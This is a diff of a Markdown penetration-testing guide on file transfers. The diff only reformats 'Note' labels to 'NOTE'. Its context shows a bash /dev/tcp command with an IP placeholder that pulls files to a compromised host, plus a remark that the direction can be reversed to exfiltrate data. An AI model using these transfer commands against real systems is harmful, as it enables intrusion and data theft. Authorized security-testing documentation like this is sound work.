@@ -745,7 +745,7 @@ If Netcat or Ncat are not available, Bash can use the pseudo-device `/dev/tcp/ho
 cat < /dev/tcp/<IP>/443 > <OUTPUT FILE>
 ```
 
-> **Note:** This method can also be used to transfer files from the compromised host to your Source Machine by reversing the direction of the connection.
+> **NOTE:**  This method can also be used to transfer files from the compromised host to your Source Machine by reversing the direction of the connection.
 
 </details>
 </details>
@@ -804,9 +804,9 @@ The shared folder will appear as a drive on the remote Windows session.
 <details>
 <summary><h1>🔒 Protected File Transfers</h1></summary>
 
-> **Note:** Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.
+> **NOTE:**  Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.
 
-> **Note:** Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file.
+> **NOTE:**  Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file.
 
 &nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h2>File Encryption on Windows</h2></summary>
@@ -929,7 +929,7 @@ Import-Module AESCrypt -Force
 
 ```
 
-> **Note:** To install globally (admin required), use the following route: **$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"**
+> **NOTE:**  To install globally (admin required), use the following route: **$modulePath = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AESCrypt"**
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
